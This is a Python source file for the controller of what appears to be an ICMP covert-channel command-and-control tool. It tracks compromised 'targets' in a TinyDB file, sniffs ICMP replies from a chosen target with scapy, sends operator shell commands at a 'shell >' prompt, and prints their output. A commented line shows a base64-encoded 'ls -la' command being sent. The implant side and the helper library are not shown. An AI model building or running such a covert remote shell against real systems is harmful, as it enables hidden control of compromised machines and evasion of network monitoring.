#!/usr/bin/python3

# self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))

from scapy.all import sniff
import base64
from shellylib import Host
from tinydb import TinyDB, Query
import os
from termcolor import colored
import sys
import time
import argparse
import readline
from multiprocessing import Process, Manager

manager = Manager()
shell_lock = manager.Value(bool, False)

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.db = TinyDB('./db.json')
        self.mock_stdout = ""


    def list_hosts(self):
        response = "[ Targets ]\n"

        targets = self.db.all()
        for target in targets:
            response += f"[*] {target['id']}\n"
            response += f" --> {target['ip']}\n"
            response += f" --> {target['status']}\n"
        
        return response

    def sniffing(self, target_ip):
        sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")

    def interact(self, target):
        Target = Query()
        target = self.db.search(Target.id == target)[0]

        sniffer = Process(target=self.sniffing, args=(target['ip'],))
        sniffer.start()

        while True:
            if not shell_lock.value:
                cmd = input(colored("shell > ", "red")).encode()
                shell_lock.value = True
                if len(cmd) != 0:
                    self.send(target['ip'], "instruction", cmd)
                    
    def instruction(self, shellpack):
        if shellpack['option'] == "TRUNCATED":
            print(shellpack['data'].decode(), end="")
        elif shellpack['option'] == "COMPLETE":
            print(shellpack['data'].decode())
            shell_lock.value = False
        elif shellpack['option'] == "ERROR":
            print(f"[ERROR] {shellpack['data'].decode()}")
            shell_lock.value = False
        else:
            print(f"{shellpack['data'].decode()}")
            shell_lock.value = False
        

if __name__ == "__main__":
    controller = Controller()
    

    match sys.argv[1]:
        case "ls":
            print(controller.list_hosts())
        case "interact":
            controller.interact(int(sys.argv[2]))

            
    
    
